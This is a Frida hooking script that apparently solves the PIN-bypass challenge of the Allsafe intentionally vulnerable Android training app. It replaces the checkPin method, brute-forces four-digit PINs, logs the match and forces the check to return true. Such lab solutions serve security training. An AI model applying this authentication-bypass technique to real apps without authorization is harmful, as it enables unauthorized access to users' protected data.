Java.perform(function() {
  // var <class_reference> = Java.use("package.classname")
  var cr = Java.use("infosecadventures.allsafe.challenges.PinBypass");
  
  // replacing the original checkPin method
  // <class_reference>.<methodname>.implementation = function()
  cr.checkPin.implementation = function(pin) {
    console.log("attempting pin bruteforce: " + pin);
  
    // generating a bruteforce pin
    for (var i = 0; i < 5000; i++) {
      var isValidPin = this.checkPin(String(i).padStart(4,0));
      
      // validating the pin
      if (isValidPin) {
        console.log("correct pin found: " + i);
        
        // stopping the bruteforce once correct pin found
        break;
      }
      
    }
    return true;
  };
})
